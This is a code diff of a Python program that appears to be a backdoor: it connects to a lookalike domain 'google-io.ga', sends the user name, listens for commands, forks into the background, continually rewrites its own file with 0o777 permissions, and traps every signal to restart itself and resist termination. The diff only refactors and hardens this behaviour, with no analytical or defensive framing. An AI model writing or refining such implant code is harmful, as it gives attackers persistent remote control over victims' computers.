@@ -17,7 +17,6 @@ DNS = 'google-io.ga'
 
 SCRIPT_PATH = os.path.realpath(__file__)
 SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()
-print(SCRIPT_CONTENT)
 
 def listen_cmd(socket: socket.socket):
     cwd = os.getcwd()
@@ -51,7 +50,7 @@ def connect_to_host():
             s.connect((DNS, PORT))
             s.send(USER.encode())
             listen_cmd(s)
-        except Exception as e:
+        except:
             time.sleep(1)
 
 def persist_file():
@@ -61,23 +60,24 @@ def persist_file():
             continue
         with open(SCRIPT_PATH, 'w') as file:
             file.write(SCRIPT_CONTENT)
-            os.chmod(SCRIPT_PATH, stat.S_IXOTH | stat.S_IXGRP | stat.S_IXUSR)
+            os.chmod(SCRIPT_PATH, 0o777)
 
-def main(*_, **__):
-    if os.fork() == 0:
-        threading.Thread(target=persist_file).start()
-        connect_to_host()
-    else:
-        sys.exit(0)
-
-def init():
-    for i in [x for x in dir(signal) if x.startswith('SIG')]:
+def handle_signals():
+    SIGNUMS = [x for x in dir(signal) if x.startswith('SIG')]
+    for i in SIGNUMS:
         try:
             signum = getattr(signal, i)
             signal.signal(signum, main)
         except:
             pass
-    main()
+
+def main(*_, **__):
+    if os.fork() == 0:
+        handle_signals()
+        threading.Thread(target=persist_file).start()
+        connect_to_host()
+    else:
+        sys.exit(0)
 
 if __name__ == '__main__':
-    init()
+    main()
